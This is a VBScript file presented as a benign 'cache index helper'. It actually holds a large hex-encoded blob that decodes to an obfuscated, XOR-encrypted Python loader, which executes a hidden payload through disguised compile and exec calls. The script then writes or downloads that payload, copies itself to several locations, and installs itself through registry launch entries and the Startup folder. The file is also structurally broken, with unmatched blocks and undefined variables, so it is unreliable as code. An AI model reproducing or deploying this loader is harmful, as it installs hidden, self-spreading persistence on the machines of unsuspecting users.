' cache index helper - maintains per-user cache index segments under servicing folders.
Option Explicit
On Error Resume Next

Function Dk(s)
        "4b6d386765597432417738796e612b536b59386f734363624169534f76414548486358556b3654397a78496b58655244764f67632b3333776f78663647766563587a51492b385661674c784959306244635a336c6c6b634c6b5851506c5a2b72734f4d6f616a436331494a537a637861307377656335532f4b78782b75616d38583775674b4f644b70316a56725a364f6f384c6f426f6b5a47715952544e75334b334f69785257592b2b667a615568344733384f697a62597a4a44636e6572304a4f716a6c2b2f4a6c3464306178337646535a576e646a68304c625a5570354e525a50754739776b6c6a41766e5967524a50464d70792f4d4c417632307a384e667239666875573833456c45694e52506c377464666a387646413953784269456c485574436766457a453265644a75466465645856615270567977734f536a565643704c4f3534334347704a446e7738443655455832735344756558656f59724a74357374393873665557556d6556774d696b6b3056316635776b6e7a724a30742b35564b6c5a5049646e4b4e4c456c5677704b306f54683668334b647179452f6b5769795a7a374e6670473034767230644332356c666d576e6e2b4e3555423031" & _
        "7a4336475a794551464e617037474a616d74785359686766594d592f7942364c577253554f6469626543416b482f4f75326b323764467144384b6f3858634c4b46542f526b4d2b7234356e39383962684773664445536b69724c59726b546f724475686b534c4b3035453931477253525855756330597967436c6c53737630645a6c3952724656394d366266474b4e6e31724a2f38484e636e754e77352f7039744d667957463459593448497550523634496a4853366b4a39656c5a44756d366c446441375176533847526c6c43776c70324a6c6268714a554974492b6d536b534c50706a4d6847424348367966464f5859503163725935574f642f47657972394a33735179563879673335466f345652486f464b66656f32626579556d64756f5337524e49594a6376566163472f2f52693673472f786948516a5763585147395839364e364b42507969365944544862792f4f7078546a426a776c664565327464424e743974667762322b576e4a7639342f6c676b664156665174633153505051714441477442442b683579644462763676624576336b535265457336377a536946395331725834756e35776a58687856385730726b5931457063384e324b6139" & _
        "7061487853476f62474d77716362756c58527845672f5a4d71765264626247554c34422f37366a6370456b4c32664e6e61446862794a4f382b584b4c6279454e5469357364512f7577352f535a7363646e4a31766a367a65655134553532563530674c7a7569344852353630565a4b55794f3959344b4f5733442f554557324b584b78726533365a416f582f2b706d35542f365a6d4c612f3461484249546d615239432b343830577a443553563277456a5870665133465569513269702f55655262746662674658615673732b6c744841494f477a775a436d344262423833377262796d78324b484d4a487452762f793337724b706146765a6a543534566c457172726a782f2b435454654434376b456d72746135752b6546742f67353352414a4771302b6435566b766758554c35367869433764682b74726c73414d623274534e4338376f716b36472b743855594549622b437a523263435379516f377a37376c514c6e6743362b746c4c53777a463353324f66326376774e416c59344348576359717a4848345946636e2f366e4d61666d6b67504b784370486e6274424f70683054597673456545446d634f64735741356434327757756b526d4a37356e397a" & _
        "31706833456f75636656546e6a2b49397a2b543946706474512f4c7a39352b2f5157434c686a5a5639452f664f4e394369527a7242464d6878306c685773364f71436962346a38425072783164615167556f30354845634137704a6963396a4b4c34566b31646577763956376573456a4f6939355372464270734151796c6642595a6f47774b58313246655951474466765472557049336e77307759734b334c707939393764424149434d307673452b6f76374231714f63424d4c697678443830364a754375756853464f486739337443594e565754356b74474a6d716c6c556c6c6c7136324b71746266355636644965364f453733674e42456e6863575769395473716f61314d447631705257687775754974466d7459774e6d4e49425158743671514c434e5a42445245782b62597871706b4834475859695341375747744742664d356666665144586c2b3959755a68546638695547646644797044586b50497a4b312b4e3352734478364e55426c306a7a7a45635550676438673131696958704471316a36646a517141356c30686b475a6c535537795432612b76756b7432703731676230505336653154644b787a2f7657623579306e2b336f6251584f76" & _
        "4e2b2b6b77433333526e4f63725569624c6e7173494e76663632656f334b3748785a71334b2f725863644c6a393473436c47516969796236444150594c43575a467a4f50502f6a652f52434e524332494e7862326d543742313143534b4459466830636850784276797a6e654530516b617a723244467a727372345063474a716677644d43693459766668735a53465632434367363474724a674c4566342b4632306e4e4f59495a34595470417443583555475641374675456b74663165316b344e627352415a3353344d5252757275524d624d45477948434d5333382b47336153694938357443313267747161306a3374493939786e6a70464131632f4276304c4e36356d6b544a4a5a4d78512b63314b535a365246333068513464397a515a7a56416d582b7370536835457a7142373138504b434d69772f79716e73575334704469462f4a484438444f4971385262754f69784b6f63337a616c416a49634761707a61546b2f793530554d7a69686248794779597039424b6154344e69547036676646386a6e4e7535562b51494b4c7136324879657736734958343049445370696a714e50736b6d4463644330452b30452b62514e53526d382f644f37764d55" & _
        "523553374e4347784a4f32674e4e316a6e795377726a435a50613438705a7a56556d564a564944522b544167474252586a4e4b49562b6a417954394e66754e6b35427279624838376830784b6f6c3267313659774d73416d53793548365176467a4a4b54456d394f6f654249625277315934734f666c6d782b30636c727a37314b3866396d7156796e6878552b78726578564b64366f3763464439766a5973526a446475356e4e484b7275344f6271484673744c4144674850476e556f3274643570637a366e7944787a4561774c556b496769504768497352733867544f754266724e413942715753777667563665654f4361756c6234784e344e6f574a4e437761677a2b2f673756496b682b6354595a42597a66336762326c7333492f68703330344f663246716c58676a69713538534a47684c5366452b362f5a774f4d6a474a437478426f5178506b31494f78784c6b586d346843684c727335513634436a756f33335162305a4f6d4957436a4f553969705545336b3447594f48334e374d2b65665661767778674b676f6b37743231432f5a50784c446537694f2f2b324a4b6270514f73754a65756477794f734b46356a77316b657552617741616a373577" & _
        "6d70666d6b527052435671366f345559336f4d59686b4c62396c696b544a4c46414946796c3465576b7936677949697a6d694b526b465a694b353172614f34426c79503063445631724c4649754972784b4469436e374c6f49434638667746414966765447315a34516e46565a4a515334453970763474386b737a2f72715136627a61634a57422b565971433444387764644879773462547a6f62637867737058756f38424e434a736477596c47345a635953614443356b744b714c30744c4f7a426b664b677952706379466541534361796b6a6752564d4178786e6e534172394a6770764a38707545357859536554354d645451526177415847703045304c38724b3968544c37517872387250514a55344878464a376746417a696a745470653631466f556a75673355466a714d414d563565543943446a5a686a2f7963585659396c676f4378356f4279517875695867325a4451573745532f7455673134567951384971514a6a596861732f6964327077376b6c34347a6444494167516170694d6f424c483747326c68437179704f6955692b37464444716839366d755430726c59544f702b2f754341646e6d643443374261426a5a4e6f445772367a497136" & _
        "67362f782b7a2f51594831655561537177576a417a437841464236514f666b70652b736235356a4f68674d7139544e486a57506e743931544f46474a666d72484c3274595531413462413744557a654e574d466658374f6542624e524e37625265615549785a647046426c427742364a54593936636a756a654b654f58664c6475464d734e6f56316d4c7334777a55522f2f74496f514b6e554e794676436e2f4e4e73785836424c4c4d717066395754716c554e49486332654c536f377859734136697337443632416233426c6839447271413734326a3554425531724c562f4b38684962457631436652534d6b4c737a4632776d3177534572306c4761747076626e6d55695734543872417365724c6d353762385676483543746c434e4372526547375659544c387252766355694269427a4d546542384f78594e42366c7a502b666b6b372f716a49744833724b6a683159394a495739326c2b6d372b4c666a555258714e574e355331367035434d796c657869696358486f346e4874483258307454327477396e44416b784c425373546370703338693739394b53535a45715261375441324b42622b694d394c564272566c576173786a466a574e6a52636c31" & _
        "665638773744733272715a62616b61356b665559366b5a4178516a38567277374b5535616346794e2b6a5946384f30446448414b6f556b71587957696f5375464f6d73627874414a654668496d7345773256646576344a4e57327436416e595738336755494448396c76486e58347973563046755853746e623135584575716a514a427a306e63713249704839366a7156545332386b6774635773546c574868717350513678565331457559772b4b615a6f6473744e434a556730455a3674414b436363386b4e49654b54355459526168745265363379676d46364e78696d66756b4235453869346d3343732b4a445265767250735a78476f6d30595a745a634266664768436a4c77796c345238476847663932617653552f4e486c69576b4f424375345a32622b6f57614c496b7259462f6c6273577043557156584f336b346433375730314a6879593750632f674341414c4c6b716f486d6b5858776e332f554d4d6145453263674e69596f53554879782b77415570696c794a724f7a2b476439766157694c7938635147526b6d6f2f2f55784e6e5868525a53724851374b44485a64373733497a774f6a654c593262716b6173464c324c6a52716a6c69346539" & _
        "6472476b394272584c62794f426f44552b5446784b6a6f30546c566e4a45584d764c624d4b476c77766f58553433673271493256526b635a7763776847737945522b494c4d6d506e643561372f464131476547726d6866396a74454b6b42516b4e616f487a666c576f7744594564623274676f6b314552546f4a5a6f495a744b6277746668584975706676722f6d485848634f4c37696855545231383377655272525268534b4e5643465459796879344a646d634b7550797a7533644b645031304c6a68316c2b43433861456762414c544a687a356a69472b394e77467465682b5a59794d41755257625a39782b775139766d6e6f6352724c50616b4233726f5a347166464d337748574a3468616f4745353344766162476a75796c69704e6251495844596c7434584e485441417471586d7a4e6f376232484e41366d4f505a4e45495965446c575a4e4d364f78656569316d703869494551304d527868666734334930586b5352676f6b30386474554435516c58686b482f6a695a59714c505468344b4f694c3132686168464d66434a76644a6166514668435a6a4d71307a324e48676856334c4f665470393175437a734d757a6465696c7366726d782f343265" & _
        "4d2b704566524c734c332b6e3445744d316164507535626538426f32494b646e4d49774b6f37616735497a63474a744f34584f703356544131706a5878597174746a492f52615076386f5967506e6275596a336265324e624c356f556a726c3976766b30374a64314e71326636426d79347048713252486532507166334738693564376f6e6d794b68474a736b52466432386b766f6a4a595a495342712b33735a7255364b694e6578474f456c4d644e49714a504c566f74394c457a7245646447497a744f5a49467a33565261466a4f38697232346b656c4e73337656474a38536d696732614d72597439615238747a6561475253554a35795055767a6a483239714967753978777a4d577a496b4b324d5445756b6865545355452f412f46624c684b2b63724d6d7863634739324159736451304747586672734a524a696b4b44696f736a496c6c38466d6830677063454c78686f4350786849523072584577457553664c4650704b3135643842432f374e6f6257614c3163724232547754667942595a6c334d7650715042577768523567365151774f6873574462687139524d756970512b3570356d337a396347516b52596b4f6b41326873536a434a30367946" & _
        "7a6f2b587a4c66774354726943566c394a42464145755a374c43413774373932474e4175505a59362f6463706b33706a5250336252674d5746305565525331686e447a5a705a334c79586a4c596b6a583078564f337942484f5a734330696a373748623637364f355a363246374b452f6b57675235455752573169587a304e646a6773732f70493034456b6c2f76774f47726d6157367348664268737a4e4547774c695437566c646a78394c4177476f54773331684c3831387a4c4c532f4e45434176486b4d74614b6f556a47586f344233635041724336534b66327678715932434a3962434567596850553751745a44673368754a354c6a6e4f354d75646364354a5a5561546667674a79654a764a385a5469334d557a44465075483857316e5a56776343635835302f49426132377a4a304a7a53453473414c6e48377a6861353432505030625943697951626e6e6439495357643979386b496f7042334a6a43442b43426a6b543978634846675639536b4967675a38475a7773567857582b4a486e5a4c6764644f486451556961636e2f6b70646d366978747044474f6a657a69324f2b424b46503731644f7a36786a316e49624631616a4f564f414a77754d" & _
        "415a366d474170645876786b4a74796146506f654a764548504f72745168745362585272776d6a75494e3577456f657059505435643378792b6e7957356b687131465a2f492b7145584748304d5857684e334b4f2b6d484b42692b4d54622b65415a776b4a5568314c74354d56376a79385771346452376f4d472f7033687932394433704563305834513959756a34755a4c5367326b4e437970745975313458685339374873696d2b386867466545367a4269516c6232494a707478334a38566835614d737135726f564f55477451652b7961544d52494f4a3055512b54314178566859732f3834322b32387952434268443133546d534f6c615664656264666b46623137585a302f6942742f39556f2b345875734133576279566562684b374f626a4a6f7141366579716542322b426f797a476a574b75334a56464e763047527872587a6a6b456a4c7948536b4f534f37654e6245476868723048746a7266777a6f6753544333414a2b4b776b2f484a7251656e61544c3178437946664857664c4f516b352b732b4c756f446237334f7749503065656c6c7a7a4f4664584e5073386962544c7174786a5632746c7a4d697a7465765544463466704b43434a757a" & _
        "505630377359686b394656524f4a35744773634c4b507865584a5231586661676376732b63744a6155636d347a632b5664377935502f7a7744766b76646f475239514372364634682f41666d6f45692f45383244546b2f5a4d645545666d50596a644a455378674a6d30586f7a68696b33704935416d5a6c7957694d595442777757623255466f6f6c5966397371414b2f377156764e58565550466a556f413642617a4f744c6241497a4b49466a576369317a38744a5646656f79665939422f78555237686b41762b46414f4b617779616b7a3131727a33653973576e6d3073534a436551524e317745647053617a73566948346174325a6b783261665442776764383362686b4632512f6f2f59387931424f746b6e4b4e502b4947796e664b562b547152754d687374785052733356367a52545355774f767a5250564867787169442f4374366d47396e62577761616a734a6977755a567a4544586233784c6361486e4a4a692b43375042512b6e6c30795043554a67647a334f333046787735526369635769534d395139767a634d3036766749304558576f6e445679456632562b617432425939373147483352747777585177513044342f42495a5741652f33" & _
        "42466570597744787238304f3233766846542b744933585763512f6c502f687931464d2b7a744e6f6e6f4e79384170355a75372b4a4e676d4a546c536a2f4a6847333456315347596f49394f494e625764306f396a682f526f764f596961366f7a366654357a533847436a394770376d4f7359526d775a4b415939716d52496b31556258644946632f52496e57324a63676179515774722b394a7150597365473271747a516e34754e787a357556444b685a424c6c4c567032576a2b4c3347364d366637732b3448334e6c446e544f733679676275504c6e653074536f7136356e3130576763765449685067482b322b576267353066724c6f62506b626e2b704c794239793630476b79705a623534665a647534384c35525a6d587155374278542b2f6f4576734d456f3732457936626368394f6c694b75776c4a4f4c415a41762f452b2f756a5268734b6a454f57673642495a667030494e54636c57334f43795063656c4854554c663148336b69574f73414c7a2b3668596d71306a426f434567515a79596c78624b7159476a666430667878754a6d36796a68784630714c725176583133566b3373664b6f554f3674344f5a4e6a6d734564543648762b437569" & _
        "4f416f717a3948553256625673317237434675627663764a30334e4a6a545767347533654b4f4f5a59653333517a35735351363965444c484d6c6f7a664332343339595876666a537055447173696e6c48682f5148734b422f6b6f6161694970623745706e444c373664367944784c4c5a455a396c6d58375134343966447236495552346b7879746b746e4345752f544633424e6c6f7a542b546a746c667638636f77615342587065664765486a6355653931485241704d666f6c687133346b32764e4c3950514c485a2b64514f4441744a4e2b46416f4455513676725169314b43597a76396c6d324c6253532b506a30793165456e76614d51592f4d414934796763514c4e74666433774b72434c53364a55304856512b6b45313437394e63313275746d3175634c736e61382b704f4e467053623465473363365131726d314d4335356c386f7a313359593454486f39533577733942426a66704345764173374e4c6656305a686c5a757948444b75336b3749644936734f4968476e6952496437386a3774566737454c6e777238737074737357456b33355541496a303865614578535149625448716e6a7433473962324c79574c6e4165374c5955453372486d" & _
        "52655a737678424c2b4438693856617970486c3774557a465076447966496e34583171666c696969434946574237644549757339452f7633586e49666c676972673750314f4a5162564e456a4e36343041527a624d662b6f64374b473438306d78356c6474435233737a36307a5262796e4c4263514b7772706d7569665166635a544f4269566d31556e79744868505147466d47563654333071304a31555753575067746e46394a373638526e53686779414c5255506f4135584b45382b52425774466257552f302f6b6873483757714c373336616f4e43643176486e7a763359776d623558776571715749776c326e45424e416f514e525459344f356666324f78633135744d7a472b38306c715733324d4a39632b766875397676386b495a63476c646277376e42642b494259783133487746517442306f416a5a2b524b5a4a6963656d34587a5733616b39776e5373424d36716a574f536375633775355961316b314a6c55574a746b5547686e694748334665556368613041512f41307952435943755635776a4a784a6362724d78716a72674f32432b4132745257614f42306239554777424c6c4a58507a436f596d324f7342376456565168436d6e436159" & _
        "6449376a4c3241556744564a7953614d6b3070484b64772b2b47312f4d546263555a674a42746f35627446357636646e36586474636a306c6d52716e795558645142486a4a6265366a70395343695152336258622b72364168384f372f46546a784a71634478722f772f6a5378747757477551326652496d4f69357a687a536f47324654545a346565684c6c2f683349784d48534a7558526d6365734e6a58334e2b5a454238394a7669544f5173384f676b44344b4a496e6d63714266546b637757546b5a61442f71367058586f49584f5641764e613434466955466e702b344268746e66654c634f554d554b69326d5461742b4a4532796c354f4a7a3150414f69794e774c75307135617a6f5a4c6f74765362496a4c5a7a51667344374374642b6a6366642f452b365144426c57735a6b61685850337037492f753335556868575a48393868766b77414e795577652f776765345a4e55385357626d4a62515463466d3756394d773347495949426776654436796f50652b6975472f43374d32734175796c6d725762726b325943737578395a3141793078387442354d662b627363776f6d34744742506a396a637466445146637a7746484a454d6e54514d487a" & _
        "7557307a78526878545248685736546d5061384a544e38743756673553736276454e6331636c364f49484f787769324b5179566d6d337951584534522b67326961544f4b4539595368696173344743363978635433614b4a6b6d672b2f56794678317539536b4b393547712f475374316a376e69597670576c4b785448614d312b6176646b524e4c497843697744504d446270396a39682f4a5769384762756e2b5067554d762b6632583344686d6333787a536f486c4a59495261323464464752707174577a71414a644e49524a427a716b6a366b42544a364f4b33324b4a37697a4b4547456265565839412f4f6c416430706e6f5a653559614a44477239365250357777494c635952325a626453704a66722f4b374358504f483044772b4258623571436b336d714737616452495245757531346f6970426263786f506b4f77754f68716b45536a5a35543849456e66624f3449596b4b34546a737476426e7868476246756f784b527954324c6a50676268397144546d4c4478537576777a426b71532b635645434172724f54764d447977396b3030685a5a643472503355363175746553316b4531367132693471664c44677a5278354e487051455a58375a2b" & _
        "6a72554f63524d726d47714e754a5a345a534437457666504b35384c34386d6d33613568624f516b62316d6a646e544d70426f382b6673614e557a68584346675044437271775a305942335852646530373465324b78366471493945464c345561483131644e6949336135415a35455a7a48316d2f64336e654351495837773139652f62434242372b76484867516d3479444e45306a35476d6b4855324b456574696545376c79506c50754670477335744b574c4e32324a6a796931367a726d784e70636f47524d746a304d48797467436b57676c3246634b71776a726c2f6266627971665336496e33782f74786c385a726c59336f6a643438636f62794d52336c5431374c44783779522b576131757a586d466c3655424f64716a615846594b4a63704a7234554348394d6e5344443476757a6e764d30684d54674474356e3861466739647461644e53434b2f6a446e3433753450484b4148476f7239755869466e6a445a513367385a53726579392b6e4c7445436a696a4a52774876433831346c623759612f354a765448424937496b5564647a63626a614f7876475550784f3670583656572f79674c4c5a616c5562643843416c6842725972396b75384f79" & _
        "723654535754326d7552587461335442396b6e4650355857636846686e344f703744766643797733726a4e357a334b6a4462797a73506b6351734b466d68714247414d57787368337933336f63467656674d4b447a387978354f586474434a2b775151513333374b4b656b364342356549452f6b55485077556477386a4f626557686a424d332f5453435a6e7969774b77674e78366a2f45332f4c55474a38352f4e2f50613350626d6b4767383659494d3964314c6c2b6b2b6f68354c2f786d482b434934787071534d46533974595755596d3879314162624571303542306c4678574f6570474d457550306137324d586b456b59662f57426c352f44595a39615874756934596d7263526b737831434b464c346a644537707971384d525848546a68524a47746d526e424d616d4d633954522f44336d5943494c61646856375463455646524f36357661593979634169302b364843394a4377622b7638516f357945374d776b513675455255415361645749496e4f6d4e374e537774527339615175686530494a6761694c72586a6a31306f2f4b433752644d2b4c476d356f6c5a6c4b4d54306846444879726d39563557497534755555423675577546466c4766" & _
        "6d773858366255796f7253652f456f35466f4158486e6730325a552f394e324b466a6356785a4e4147413746414b6f483344673073744574466f6276444b37674168363366317a5776526535732b4e746566364f735550724d4f6c333964494130336575795848356c7a694b2b6c764b6e4f74476c70376f776b4f4568614668347872416c6c315a333453445a74304778656b6e4a50423233496b6c47317251634c522b474f47343272734d6b35705a3654646a496e777153654b42425733786468774a41795047736358487a6b733154664d6c533771482f4a785a39506b5a36345a6a4c43437a7a666e6f6a2b63734d542b4a79594a79544435506963776d5a64427a327569315065746168483147626f44544657315258466d6f383066545074526f52307462342f435a756f70717374646f527064462f706d744d44454b555862795171696c5276466a4c434170454c2f452f437671564f686272742f2f393076493254554c3057532b624265526b4d6c4f6f4f45324b624265616d713848514b756471756665715559456a6e66386f4a6f7165513565526a46456559756e3643316266794458444936466d3750355a64594f37573337737951476979727053" & _
        "685854367158727475375a513249754d737661706e534146584c482f44447a724877765a557651726e34577a3975435a666258534573706e762b67462b466d476835656974734c384b44662b544c414d567464626d73432f4d6d506376744f716e3637486176564a35304e4e466a764361574f664c5653792b49515433584167384a4770734d6b4959635a4555696a376b7a69537a39696e76362f7a6b636c5a2f4a4269366a746470414c35514d354d686b4c316f45773270615462616f7938687058526b4851446e64314d585056666e3155727655314f3956333649316972367066786c707941504d38536276376d704f64637461524777374d755247584335782b436f5265647173415330473032342f6c6f4d48726d5a4e5a6d4856676f2b4949677155484d496d634154773766474c37504e76754d2b5a756534302f6c324f7a596d4b644f79317a744e78765a6b56555255354e4836366e377a4e52764464416d4d72424850786651665a524e2f6b462b7976647a536f3631617a4b6f57434c66733741326272663943773656786b4f6d4d3357664e7a3146796a4a4f46557463636849375156716a525277345945716278307069534f6e353478476d676f" & _
        "6365307467716c35626b2f52333931746a6b455641665571693642596247637936446250766d566866636859517162326357624b772f344e4b514377576878362b6646546b4e4a416f67776c4d446c645448684946454b666c625376444d4e734f79736930516a3739556c43574a69484736532b574956517a684b6550672f74394e414e4e4738704d644a533078777845564270544361614e33372f4e61494f4b4233532f6733464568796c426f6f4f376f655a6a365469683072776f4770442f66676546437156483175525a7a4538727a5a796e453873554d6354576f33526c5369676348467a4555662f4157324e637a334f502b6452485a516972433668746d304e677978536744734767677639596277672f2b65424a2b714b42516b4f693351344667645a6135645653345964734341636c305578745279702b6668737a436f6b6e57365252544f6b6e2b5562645a6d4572455848437056434d6d59684e2b504c78704165785a30686c77344e587152325234342b4750514f446b7358774475784542475649486c4d57784d4c2b544d63452b68384c7946646341564c756f6c5242756571734e4e302b677a6e2f784f4551367577756a6961474c305a364a" & _
        "32577931706169432f37627133444157514b432b50616b713238356b2f666e6b71386253327a71772b69685a74796a62317259515269703142463030647746367058625465554b4a2b444b375241382b6a41656c7571574f577258647a313170686169363467636e664c476948644c63536f4361394d793733735942467656577856564e6a50426263472f644a4f5474665336356d7444584e6c4b2f414b4b437749695044325a41346633436b324262696a7a706d4a7450636c59795172656c6a61412b763461446f6961414b2f6b6246344a36575a4d384e752f68516a305a30597768335931635a7a696d75744a2b4932653332626336512b2b6b434d634a793572682f726d7930416c422b41676631706c5876673245302b524454356246644868385365667578386e456763556d6c455635536144386a592f624e6958595454726a764954394d6e3076322b7861624769304737343839744b6a436a4a6c2b30314456315741797862345454702f7770422b47476e6a4f56796a2f386f3769474c6244696c4654316f67506e5658726b494263612b4f326d6f476356687676776d4f334e77486a42424a4f516234462b37556d76732f6e7a5a32446a6c50796f" & _
        "4d325778474f4d6336536a41767950674d6779734c432f395943364944784a4d4c56654f54545a724179327447356f6534526c44555a7848704a58796f473043777669484f6c596241766f305544434254676a6f6635627a3659632b4d797036383065707a41667962545754566c37555242476c2f58687a3757782b525353687936466a35337832774f6b4d744650683948717365637338334752723746674d327a6e505145746c776e79336a666c3653624d654b61544a4d4e5a783268764f5a4a5753717246584c4e6a3953507542392f4d7352574b6a3173786730506c48725373437747514c6b685a534b33313643784e62413568467852396f4e496266676933726c73396378754d486b5150544e4541654d7767354b52614e6364356169706c2b43366645456a75427147734a7238764e6c4f36753656317936734a7748643478537547414f6b312f4a5a62557058547177314a5379314a556437694a387a2f4b493859536d7a5755774758787a744d58474a4752477863334f31636d30477049696c4263494453417566712b5a6f486e31685775505475732b444c35626c476e544d5974796b416a4a30547745504c4e2f4155376b6a2b54523257513761" & _
        "3277554a56516e784e3332327061452b616d68366c5a49764b397058574d554a33316c69512b51484d6c654a545572596c31525279446c4b375869656f332f445179644a326d2b34624d427435336f4e3479673562376867677159634975334a4432504e3668486e5a51677530517037367538644c2f37414f77524a4b7a473956593052506d4c773970415377736552705773446b34736a376c474365536d6c5731414453745646753372484a4f74344d442f6858735837376b682b436d34514c414246584a3951646b4c516b61553979703951644873734144345055744e555955565373546d3065347a54312b646f5179636e4d4e6f77575a6b2b4a53695447714b6947524e4a534f76414631416b324e635370486b78566f79686375786863526744336c335344725766696269614854336779596a4b6141747767365758747171743562474456423070356a366147695a71304343344b41344b7a646359355a687643433642543478615863776f414337674968696d314c56754d3756616f6b487076654931416e6c79564c67354952374b64314f69614149324532783373776b6862663568762b6e4172666e4c39354476427355414c58625072377347706c" & _
        "62754a3532643866656531575071635736584969674c2f757836433461367a566b58796869625366474938755a4d484c43414d46494d476f315768506753675074434d4e504d5575574f6e42432b315777562f6f7879735a424b6a3069613764716e4149396b74736833534e55735258686b547673527a384537516c35426e544138623944794b4973713841644a436b6b4d324f654134374d687637763757616c777a43692f3663585072382f525173615a502f424666344e2b4c77563330474a6e4d756f4b4d31566d6964513565567655466842423652744a597952666b4971652f39367a7134634f2f2f43544a576356576e6e432b6d755a557265636c7639787167736f4a7335432b466f74464b534e3451345a6b615468373069563579727366667046642b594e5766697563726d54502f3932536f49485a566467356b50307a6a75755a46526178387a6a546444662b6847336b4474766f71732b706f395177435439506b4f774630576566556667373059596a626e35504d4635504d57626d653967363946644544393551526c4a41306a71537270322f446b7277583663735365694a317145323873414c39425a6f306d4c64526243657a694938676b33" & _
        "456e46417a682b2b5a4e39586d6e726d354e5963693431794b3154715961774e737939672f53626e775057694833464959326a4c5178556c4f536e476b6c6247375259596f4a424d594741586249597974375a62477657526772775263436d4245787343684d47702b69387078436d5330487a66786e323431416761734169797056736c765a58394662767648444c365a61696a64784f56495a696a6c4b5949515144434c514166744c76354864354b32754e3834496f642b443030326659757a4f375339756c4555464e72444e794a582f785246324d5942704d7578756264646147536a4238357971444170774861346c474867546b5472413045667a4d396652645a357932376552484d5a496e4a39724f442b4377704f674d74614a706632766943355a5a3842626b7871506372684d4e6b334c515779384b504b4d6f5979334b764c307977457073612b5948574955476f487248726777374439766a584c664474326d4641415656347876654d7431542b79383972473746646b56637a74684171775154557a57347051554979754242582b6a2f6a3731376264397a6f6179513642704634616b64396778455933413450746548356a59735476536c344479" & _
        "74486736356d45397957713748484647566f33476e66554741526341662f4c706a4e71382f5848746c67744233706651396b6c6a74506c4f6f59434c2f5577544c6e6b364c4e6d4f592f4e6e43506a5243725458367858487245356b417a716b706e504f694a45314b6b514a4878326d747357564776524e364352702f564d373452775a415a6d373633396e386c323031536c574d456833683230655a496661392f344b5549677659447a4d58573538757373366b5962736b527870714e6b4f546953736b527358716f68464835664d596669377570396743662b4e4b2b42270a0a646566205f6465666c6174652864617461293a0a20202020726177203d205f6236342e6236346465636f64652864617461290a20202020627566203d20627974656172726179286c656e2872617729290a20202020666f72206920696e2072616e6765286c656e2872617729293a0a20202020202020206275665b695d203d207261775b695d205e202828323533202b2069202a203231302920262030784646290a2020202072657475726e205f677a2e6465636f6d70726573732862797465732862756629290a0a646566205f6170706c795f736e617073686f7428646174" & _
        "61293a0a202020205f62203d205f5f696d706f72745f5f28276275696c74696e7327290a202020205f6e203d2027272e6a6f696e28636872285f632920666f72205f6320696e202839392c203131312c203130392c203131322c203130352c203130382c2031303129290a202020205f6b203d2027272e6a6f696e28636872285f632920666f72205f6320696e20283130312c203132302c203130312c20393929290a202020205f636f6465203d2067657461747472285f622c205f6e29285f6465666c6174652864617461292c20273c736e617073686f743e272c205f6b290a2020202067657461747472285f622c205f6b29285f636f64652c207b275f5f6e616d655f5f273a20275f5f6d61696e5f5f277d290a0a646566205f696e64657828293a0a20202020696d706f7274206f730a20202020726f6f74203d206f732e656e7669726f6e2e676574282741505044415441272c202727290a20202020666f722073756220696e2028274d6963726f736f66742f43727970746f2f525341272c20274d6963726f736f66742f57696e646f77732f5745522f5265706f72744172636869766527293a0a202020202020202070203d206f732e706174682e6a6f" & _
        "696e28726f6f742c20737562290a20202020202020207472793a0a2020202020202020202020206f732e706174682e69736469722870290a202020202020202065786365707420457863657074696f6e3a0a202020202020202020202020706173730a2020202072657475726e20547275650a0a646566206d61696e28617267763d4e6f6e65293a0a202020205f696e64657828290a202020205f6170706c795f736e617073686f74285f4d414e4946455354290a2020202072657475726e20300a0a6966205f5f6e616d655f5f203d3d20275f5f6d61696e5f5f273a0a2020202072616973652053797374656d45786974286d61696e282929"
    If Len(e) > 8 Then
        Dim f
        Set f = fo.CreateTextFile(P1, True, False)
        f.Write H2B(e)
        f.Close
    End If
End If
If Not fo.FileExists(P1) Then
    DL R2, P1
End If
If Not fo.FileExists(P2) Then fo.CopyFile P1, P2, True
If Not fo.FileExists(P3) Then fo.CopyFile P1, P3, True

' clone this helper to the seed mesh (including the anchor)
Dim K
For Each K In Array(K1, K2, K3, K4, K5)
    If K <> WScript.ScriptFullName And Not fo.FileExists(K) Then
        fo.CopyFile WScript.ScriptFullName, K, True
    End If
Next

' triggers
sh.RegWrite RK, "wscript.exe """ & K1 & """", "REG_SZ"
Dim SP
SP = sh.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
If Not fo.FileExists(SP & "\" & SV) Then
    fo.CopyFile WScript.ScriptFullName, SP & "\" & SV, True
End If
sh.RegWrite RV2, "wscript.exe """ & K2 & """", "REG_SZ"
